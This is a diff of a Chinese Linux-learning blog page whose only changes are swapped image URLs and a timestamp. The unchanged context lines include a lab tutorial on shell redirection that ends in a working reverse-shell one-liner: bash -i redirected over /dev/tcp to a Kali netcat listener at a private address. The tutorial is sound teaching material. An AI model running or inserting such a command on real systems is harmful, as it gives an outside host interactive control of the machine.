@@ -43,14 +43,14 @@
 <meta property="og:site_name" content="Hades">
 <meta property="og:description" content="1.Shell变量的分类内部变量： 系统提供，用户只能使用不能修改。 环境变量： 决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。 用户变量 用户建立和修改，也称为用户自定义变量。 2.Shell中变量的定义和输出格式：name=string name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。 “=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/5.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/6.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/7.png">
-<meta property="og:updated_time" content="2019-08-16T05:35:11.801Z">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/5.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/6.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/7.png">
+<meta property="og:updated_time" content="2019-09-08T12:28:36.750Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于centos的linux学习3">
 <meta name="twitter:description" content="1.Shell变量的分类内部变量： 系统提供，用户只能使用不能修改。 环境变量： 决定了用户的工作的环境，不需要定义可直接在shell中使用，某些可修改。 用户变量 用户建立和修改，也称为用户自定义变量。 2.Shell中变量的定义和输出格式：name=string name为变量名，以字母或下划线开头的字母、数字和下换线字符序列。 “=”为赋值符号，两边不能直接跟空格，否则shell将视为命令。">
-<meta name="twitter:image" content="http://pw5q6scnw.bkt.clouddn.com/5.png">
+<meta name="twitter:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/5.png">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
@@ -280,11 +280,11 @@
 <p>nc： TCP/IP 协议中的swiss army knife，是一个使用tcp或udp协议通过网络连接来读取数据的一个工具。</p>
 <p>bash：unix shell  参数 -i创建一个交互式的bash</p>
 <p>如果我们不使用输出重定向，echo输出的字符会显示在本地的屏幕上。</p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/5.png" alt="1"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/5.png" alt="1"></p>
 <p>在kail下开启端口监听  <code>nc -lvp 9999</code> ，然后我们使用输出重定向符将字符输出到kail的显示屏上。加上bash -i 以后我们在192.168.3.79和192.168.3.83之间建立了一个交互式的bash，将192.168.3.83的输出重定向到了192.168.3.79。</p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/6.png" alt="2"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/6.png" alt="2"></p>
 <p>接下来尝试一下从192.168.3.79输入重定向到192.168.3.83。</p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/7.png" alt="3"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/7.png" alt="3"></p>
 <p>知道了输入重定向和输出重定向的原理，把这两个结合其他，就实现了shell的反弹。</p>
 <p><code>nc -lvp 9999</code>  <code>bash -i &amp;&gt; /dev/tcp/192.168.3.79/9999 0&lt;&amp;1</code></p>
 <p>kail本地监听端口9999，centos输入重定向到192.168.3.79，输出也重定向到192.168.3.79。就相当于centos的命令输入、显示结果都在192.168.3.79的终端屏幕上。也就实现了shell的反弹。</p>
